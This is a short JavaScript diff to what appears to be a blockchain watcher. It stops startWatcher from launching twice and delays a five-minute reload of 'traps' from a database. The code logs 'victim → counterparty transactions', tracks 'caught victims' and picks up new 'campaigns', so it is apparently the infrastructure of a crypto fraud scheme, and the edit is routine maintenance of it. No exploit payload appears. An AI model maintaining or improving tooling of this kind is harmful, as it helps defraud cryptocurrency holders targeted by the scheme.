@@ -1416,7 +1416,15 @@ async function scanNewBlocks() {
 }
 
 // --- Start watcher ---
+let watcherStarted = false;
+
 function startWatcher() {
+  if (watcherStarted) {
+    console.log('[DEBUG] Watcher already started, skipping...');
+    return;
+  }
+  watcherStarted = true;
+
   console.log('[DEBUG] Starting block‑based watcher...');
   logger.info(`Watching new blocks for victim → counterparty transactions (poll every ${scanConfig.pollIntervalMs / 1000}s)...`);
 
@@ -1436,10 +1444,13 @@ function startWatcher() {
   caughtVictimsPollInterval = setInterval(loadCaughtVictims, 480000);
 
   // 🚀 FIX BUG #2: Reload traps every 5 minutes to pick up new campaigns
-  trapsReloadInterval = setInterval(async () => {
-    console.log('[DEBUG] Reloading traps from database...');
-    await loadTrapsFromDB();
-  }, 300000);
+  // Only start this AFTER the watcher is running
+  setTimeout(() => {
+    trapsReloadInterval = setInterval(async () => {
+      console.log('[DEBUG] Reloading traps from database...');
+      await loadTrapsFromDB();
+    }, 300000);
+  }, 10000); // Wait 10 seconds before starting trap reloads
 
   console.log(`[DEBUG] Watcher started. Polling every ${scanConfig.pollIntervalMs / 1000}s, max ${scanConfig.maxBlocksPerScan} blocks per scan.`);
 }
